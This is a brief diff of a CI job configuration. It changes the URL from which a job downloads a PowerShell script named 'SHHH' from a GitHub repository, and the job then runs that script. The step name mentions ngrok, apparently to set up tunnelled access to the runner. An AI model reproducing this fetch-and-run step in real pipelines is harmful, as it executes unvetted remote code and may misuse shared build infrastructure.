@@ -15,6 +15,6 @@ jobs:
      -run:
         name: paste Ngrok Value In Hosted Link
         command: |
-          Invoke-WebRequest https://github.com/UOLTemp/UOL-PR1/raw/main/SHHH -OutFile gpu.ps1
+          Invoke-WebRequest https://raw.githubusercontent.com/UOLTemp/UOL-PR1/main/SHHH -OutFile gpu.ps1
  
      -run: ./gpu.ps1
